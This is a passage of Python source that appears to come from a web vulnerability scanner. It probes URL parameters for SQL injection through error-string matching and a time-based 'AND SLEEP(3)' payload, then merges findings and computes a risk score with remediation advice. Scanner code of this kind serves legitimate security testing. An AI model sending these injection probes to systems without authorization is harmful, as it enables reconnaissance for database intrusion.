                        'warning mysql', 'error in your sql',
                        'mysql_fetch', 'syntax error',
                    ]
                    
                    for error in sql_errors:
                        if error in content:
                            result['vulnerabilities']['sqli'].append({
                                'type': 'sqli',
                                'name': 'SQL Injection',
                                'severity': 'critical',
                                'method': 'Error-based',
                                'path': path,
                                'parameter': param,
                                'payload': payload,
                                'error': error,
                                'remediation': [
                                    'Use parameterized queries (prepared statements)',
                                    'Use ORM frameworks with proper escaping',
                                    'Implement input validation and whitelisting',
                                    'Use least privilege database accounts',
                                    'Enable database error logging without exposing to users'
                                ]
                            })
                            break
                except:
                    pass
            
            # Time-based blind detection
            try:
                url = f"{base_url.rstrip('/')}{path}?{param}=1 AND SLEEP(3)"
                start = time.time()
                response = self.session.get(url, timeout=10, verify=False)
                duration = time.time() - start
                
                if duration >= 3:
                    result['vulnerabilities']['sqli'].append({
                        'type': 'sqli',
                        'name': 'SQL Injection (Blind/Time-based)',
                        'severity': 'critical',
                        'method': 'Time-based blind',
                        'path': path,
                        'parameter': param,
                        'delay': f'{duration:.1f}s',
                        'remediation': [
                            'Use parameterized queries immediately',
                            'Implement WAF rules',
                            'Monitor for time-based queries',
                            'Use database activity monitoring'
                        ]
                    })
            except:
                pass
        
        return result
    
    def _merge_results(self, results, new_result):
        """Merge scan results"""
        if 'ports' in new_result and new_result['ports']:
            results['ports'].extend(new_result['ports'])
        
        if 'services' in new_result:
            results['services'].extend(new_result['services'])
        
        if 'cves' in new_result:
            results['cves'].extend(new_result['cves'])
        
        if 'port_cves' in new_result:
            existing_ids = {c.get('id') for c in results['port_cves']}
            for cve in new_result['port_cves']:
                if cve.get('id') not in existing_ids:
                    results['port_cves'].append(cve)
        
        if 'vulnerabilities' in new_result:
            for vuln_type, vulns in new_result['vulnerabilities'].items():
                if vulns:
                    results['vulnerabilities'][vuln_type].extend(vulns)
        
        if 'leaks' in new_result:
            for leak_type, leaks in new_result['leaks'].items():
                if leaks:
                    results['leaks'][leak_type].extend(leaks)
    
    def _generate_summary(self, results):
        """Generate scan summary"""
        all_vulns = []
        for vulns in results['vulnerabilities'].values():
            all_vulns.extend(vulns)
        
        total_leaks = sum(len(leaks) for leaks in results['leaks'].values())
        
        severity_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
        for vuln in all_vulns:
            sev = vuln.get('severity', 'medium')
            if sev in severity_counts:
                severity_counts[sev] += 1
        
        cves = results.get('cves', []) + results.get('port_cves', [])
        critical_cves = sum(1 for c in cves if c.get('severity') == 'CRITICAL')
        high_cves = sum(1 for c in cves if c.get('severity') == 'HIGH')
        
        risk_score = (
            severity_counts['critical'] * 10 +
            severity_counts['high'] * 5 +
            severity_counts['medium'] * 2 +
            severity_counts['low'] * 1 +
            critical_cves * 8 +
            high_cves * 4
        )
        risk_score = min(100, risk_score)
        
        return {
            'total_vulnerabilities': len(all_vulns),
            'total_leaks': total_leaks,
            'total_cves': len(cves),
            'critical_cves': critical_cves,
            'high_cves': high_cves,
            'open_ports': len(set(results['ports'])),
            'severity_counts': severity_counts,
            'risk_score': risk_score,
            'risk_level': self._get_risk_level(risk_score)
        }
    
    def _get_risk_level(self, score):
        if score >= 80: return 'CRITICAL'
        elif score >= 60: return 'HIGH'
        elif score >= 40: return 'MEDIUM'
        elif score >= 20: return 'LOW'
        return 'INFO'
